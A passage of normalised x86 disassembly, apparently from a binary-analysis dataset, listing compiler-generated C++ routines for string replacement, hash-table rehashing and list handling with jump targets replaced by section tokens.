mov ecx [ ebp - 0x10 ]
call sub_4022a0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_4178d0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov ecx [ ebp + 0x10 ]
call sub_401890
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x10 ]
call sub_401890
sub eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x18 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
or edx 0xffffffff
sub edx [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp + 0xc ]
cmp edx ecx
ja r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp + 0x18 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
add edx [ ebp + 0x18 ]
sub edx [ ebp + 0xc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
push 0x0
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c70
mov eax [ ebp + 0x18 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0x18 ]
push eax
call sub_4010a0
add esp 0xc
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp + 0x10 ]
call sub_401ab0
add eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_401070
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_4010a0
add esp 0xc
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0x18 ]
push eax
call sub_4010a0
add esp 0xc
jmp r-xdata
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c30
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
cmp eax [ ebp + 0x14 ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0x18 ]
push eax
call sub_4010a0
add esp 0xc
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_4010a0
add esp 0xc
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_4010a0
add esp 0xc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0x18 ]
push eax
call sub_4010a0
add esp 0xc
mov ecx [ ebp + 0x18 ]
sub ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x14 ]
add eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
push eax
call sub_4010a0
add esp 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
add eax [ ebp + 0x18 ]
push eax
call sub_4010a0
add esp 0xc
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
mov ecx [ ebp + 0x14 ]
add ecx [ ebp + 0x18 ]
sub ecx [ ebp + 0xc ]
add eax ecx
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_4010a0
add esp 0xc
jmp r-xdata
sub_417b90
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov ecx [ ebp + 0x10 ]
call sub_401890
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x10 ]
call sub_401890
sub eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x18 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
or edx 0xffffffff
sub edx [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp + 0xc ]
cmp edx ecx
ja r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp + 0x18 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
add edx [ ebp + 0x18 ]
sub edx [ ebp + 0xc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
push 0x0
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c240
mov eax [ ebp + 0x18 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x18 ]
lea ecx [ edx + eax * 2 ]
push ecx
call sub_40bd00
add esp 0xc
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp + 0x10 ]
call sub_40c0d0
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bc90
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x14 ]
lea eax [ eax + edx * 2 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd00
add esp 0xc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0xc ]
lea ecx [ edx + eax * 2 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0x18 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd00
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40bff0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
cmp eax [ ebp + 0x14 ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x18 ]
lea ecx [ edx + eax * 2 ]
push ecx
call sub_40bd00
add esp 0xc
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd00
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd00
add esp 0xc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0xc ]
lea ecx [ edx + eax * 2 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0x18 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd00
add esp 0xc
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x18 ]
lea ecx [ edx + eax * 2 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd00
add esp 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x18 ]
lea ecx [ edx + eax * 2 ]
push ecx
call sub_40bd00
add esp 0xc
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x14 ]
add ecx [ ebp + 0x18 ]
sub ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd00
add esp 0xc
jmp r-xdata
sub_417ec0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x1 ]
call sub_402080
push eax
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x2 ]
call sub_402080
push eax
call sub_418250
add esp 0x8
mov esp ebp
pop ebp
retn
sub_417ef0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4177c0
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_402180
add esp 0x4
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_418b90
mov esp ebp
pop ebp
retn 0x4
sub_417f30
push ebp
mov ebp esp
push 0xffffffff
push sub_43b140
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x24 ] ecx
push 0x1
lea ecx [ ebp - 0x18 ]
call sub_40e0b0
lea ecx [ ebp - 0x18 ]
call sub_418880
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
mov [ ebp - 0x74 ] eax
mov ecx [ ebp - 0x74 ]
push ecx
mov ecx [ ebp - 0x24 ]
call sub_414690
mov [ ebp - 0x3c ] eax
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x7c ]
push ecx
mov ecx [ ebp - 0x24 ]
call sub_414600
mov [ ebp - 0x78 ] eax
mov edx [ ebp - 0x78 ]
mov eax [ edx ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
lea ecx [ ebp - 0x18 ]
call sub_4188a0
mov [ ebp - 0x6c ] eax
mov ecx [ ebp - 0x6c ]
call sub_414d40
mov [ ebp - 0x4c ] eax
mov edx [ ebp - 0x4c ]
push edx
call sub_402180
add esp 0x4
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x34 ]
push ecx
mov edx [ ebp - 0x54 ]
push edx
mov ecx [ ebp - 0x24 ]
call sub_4146e0
mov [ ebp - 0x27 ] al
movzx eax [ ebp - 0x27 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
xor ecx ecx
jne r-xdata
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_40e0b0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_402180
add esp 0x4
push eax
lea edx [ ebp - 0x1c ]
push edx
mov ecx [ ebp - 0x24 ]
call sub_418c50
push 0x1
lea ecx [ ebp - 0x20 ]
call sub_40e0b0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x20 ]
call sub_414db0
push eax
lea ecx [ ebp - 0x18 ]
call sub_411e30
movzx ecx al
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x18 ]
call sub_414db0
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_402180
add esp 0x4
mov [ ebp - 0x5c ] eax
lea ecx [ ebp - 0x18 ]
call sub_414d40
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x68 ]
push eax
call sub_402180
add esp 0x4
mov [ ebp - 0x70 ] eax
mov ecx [ ebp - 0x5c ]
push ecx
mov edx [ ebp - 0x70 ]
push edx
mov ecx [ ebp - 0x24 ]
call sub_4146e0
mov [ ebp - 0x29 ] al
movzx eax [ ebp - 0x29 ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
mov ecx [ ebp - 0x24 ]
call sub_418590
mov ecx [ ebp - 0x24 ]
call sub_418660
mov [ ebp - 0x25 ] 0x1
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x60 ] edx
push 0x0
push 0x0
lea eax [ ebp - 0x25 ]
push eax
mov ecx [ ebp - 0x60 ]
push ecx
lea edx [ ebp - 0x80 ]
push edx
mov ecx [ ebp - 0x24 ]
call sub_4145b0
push eax
lea ecx [ ebp - 0x98 ]
call sub_418c10
push eax
mov ecx [ ebp + 0x8 ]
call sub_418210
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x48 ] edx
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x58 ] ecx
mov edx [ ebp - 0x48 ]
push edx
mov eax [ ebp - 0x50 ]
push eax
mov ecx [ ebp - 0x58 ]
push ecx
mov ecx [ ebp - 0x24 ]
call sub_4186f0
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x24 ]
call sub_418550
mov [ ebp - 0x26 ] 0x0
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x64 ] edx
mov eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x24 ]
call sub_4145b0
mov [ ebp - 0x38 ] eax
push 0x0
lea edx [ ebp - 0x26 ]
push edx
mov eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x90 ]
call sub_418c10
mov [ ebp - 0x40 ] eax
push 0x0
mov ecx [ ebp - 0x40 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_418210
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
mov ecx [ ebp - 0x24 ]
call sub_4145d0
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_411e30
mov [ ebp - 0x28 ] al
movzx ecx [ ebp - 0x28 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
sub_418210
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_402180
add esp 0x4
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx ] ecx
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_402180
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov dl [ eax ]
mov [ ecx + 0x4 ] dl
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_418280
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_418800
pop ebp
retn
sub_4182d0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
sar eax 0x2
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
shl ecx 0x2
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
call sub_421ef0
add esp 0xc
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
mov esp ebp
pop ebp
retn
sub_418320
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_418cb0
add esp 0xc
mov esp ebp
pop ebp
retn
sub_418350
push ebp
mov ebp esp
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
je r-xdata
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp + 0x10 ]
call sub_418ce0
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x4
mov [ ebp + 0x8 ] eax
sub_418380
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_418d00
pop ebp
retn
sub_4183a0
push ebp
mov ebp esp
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp edx [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x10 ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_402180
add esp 0x4
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
jmp r-xdata
mov eax [ ebp + 0x10 ]
add eax 0x4
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x8 ]
add ecx 0x4
mov [ ebp + 0x8 ] ecx
sub_4183e0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4182c0
add esp 0x8
mov [ ebp - 0x1 ] al
movzx edx [ ebp - 0x1 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_418310
add esp 0x4
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_418d90
add esp 0x18
mov esp ebp
pop ebp
retn
sub_418430
push ebp
mov ebp esp
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
je r-xdata
pop ebp
retn
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x4
mov [ ebp + 0x8 ] eax
sub_418460
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
pop ebp
retn
mov ecx [ ebp + 0xc ]
sub ecx 0x4
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
sub edx 0x4
mov [ ebp + 0x10 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
sub_418490
push ebp
mov ebp esp
push 0xffffffff
push sub_43b170
mov eax [ fs : 0x0 ]
push eax
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
jmp r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0x14 ]
call sub_418e50
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
sub ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x8 ]
add edx 0x4
mov [ ebp + 0x8 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4184f5
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push 0x0
push 0x0
call sub_42569b
mov eax r-xdata
retn
mov ecx [ ebp - 0x14 ]
push ecx
mov ecx [ ebp + 0x14 ]
call sub_418ce0
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
sub_418550
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_4145b0
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_418a30
mov esp ebp
pop ebp
retn 0x4
sub_418590
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_414590
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_414f10
mov ecx eax
call sub_411e00
movzx edx al
test edx edx
je r-xdata
lea edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_414f10
mov ecx eax
call sub_411e00
movzx ecx al
test ecx ecx
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_414f10
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_414f30
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
lea edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_414f30
mov ecx eax
call sub_414db0
mov ecx eax
call sub_411e30
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_414f10
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_414f30
mov ecx eax
call sub_4188a0
sub_418660
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
call sub_418960
fstp [ ebp - 0xc ]
movss xmm0 [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
movss [ ebp - 0x14 ] xmm0
call sub_4188e0
fstp [ ebp - 0x10 ]
movss xmm0 [ ebp - 0x10 ]
movss xmm1 [ ebp - 0x14 ]
comiss xmm0 xmm1
jbe r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
call sub_4188c0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x200
jae r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x8
call sub_415e90
shr eax 0x1
cmp [ ebp - 0x4 ] eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x3
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_413340
mov ecx [ ebp - 0x8 ]
call sub_418980
mov ecx [ ebp - 0x4 ]
shl ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_4186f0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp + 0x10 ]
call sub_4011a0
mov esi eax
lea ecx [ ebp + 0xc ]
call sub_4011a0
push eax
call sub_414860
add esp 0x4
mov eax [ eax ]
push eax
call sub_402180
add esp 0x4
mov [ eax ] esi
lea ecx [ ebp + 0x8 ]
call sub_4011a0
mov esi eax
lea ecx [ ebp + 0x10 ]
call sub_4011a0
push eax
call sub_414860
add esp 0x4
mov ecx [ eax ]
push ecx
call sub_402180
add esp 0x4
mov [ eax ] esi
lea ecx [ ebp + 0xc ]
call sub_4011a0
mov esi eax
lea ecx [ ebp + 0x8 ]
call sub_4011a0
push eax
call sub_414860
add esp 0x4
mov edx [ eax ]
push edx
call sub_402180
add esp 0x4
mov [ eax ] esi
lea ecx [ ebp + 0x8 ]
call sub_4011a0
push eax
call sub_414860
add esp 0x4
